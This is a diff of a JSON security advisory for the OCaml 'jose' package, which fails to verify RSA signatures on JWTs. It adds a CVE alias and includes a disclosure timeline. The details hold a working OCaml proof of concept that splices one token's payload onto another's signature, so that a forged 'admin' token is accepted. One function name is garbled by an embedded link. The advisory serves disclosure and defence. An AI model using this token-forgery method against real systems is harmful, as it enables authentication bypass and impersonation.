@@ -1,8 +1,11 @@
 {
   "schema_version": "1.7.4",
   "id": "OSEC-2026-19",
-  "modified": "2026-09-10T10:00:00Z",
+  "modified": "2026-09-10T20:20:00Z",
   "published": "2026-09-10T10:00:00Z",
+  "aliases": [
+    "CVE-2026-89086"
+  ],
   "summary": "JOSE: missing RSA signature verification",
   "details": "The opam package \"jose\" does not validate any RSA signature. It checks the encoding being PKCS1, but does not verify with the public key.\n\n## Reproduction\n\nWith jose 0.10.0, the code below signs two tokens with the same key and glues one's payload onto the other's signature:\n\n```OCaml\nlet () = Mirage_crypto_rng_unix.use_default ()\n\nlet key =\n  Jose.Jwk.make_priv_rsa (Mirage_crypto_pk.Rsa.generate ~bits:2048 ())\n\nlet sign sub =\n  Jose.Jwt.sign key ~payload:(`Assoc [ (\"sub\", `String sub) ])\n  |> Result.get_ok |> Jose.Jwt.to<http://jose.jwt.to/>_string\n\nlet seg n token = List.nth (String.split_on_char '.' token) n\n\nlet alice = sign \"alice\" and admin = sign \"admin\"\n\n(* alice's header and signature, admin's payload *)\nlet forged = String.concat \".\" [ seg 0 alice; seg 1 admin; seg 2 alice ]\n\nmatch\n  Jose.Jwt.unsafe_of_string forged\n  |> Result.get_ok\n  |> Jose.Jwt.validate ~jwk:(Jose.Jwk.pub_of_priv key) ~now:(Ptime_clock.now ())\nwith\n  | Ok t ->\n    print_endline\n      (\"accepted, sub = \" ^ Option.get (Jose.Jwt.get_string_claim t \"sub\"))\n  | Error _ -> print_endline \"rejected\"\n```\n\nThe dune file:\n```\n(executable (name repro)\n(libraries jose mirage-crypto-pk mirage-crypto-rng.unix ptime.clock.os))\n```\n\nThis prints \"accepted, sub = admin\".\n\n## Workaround\n\nThere is no workaround known.\n\n## Timeline\n\n- 2026-08-25: private report via email to the authors of jose\n- 2026-08-25: fix published to repository\n- 2026-08-31: mail escalated to security@ocaml.org\n- 2026-09-04: released jose 0.11.0\n- 2026-09-10: published advisory",
   "severity": [
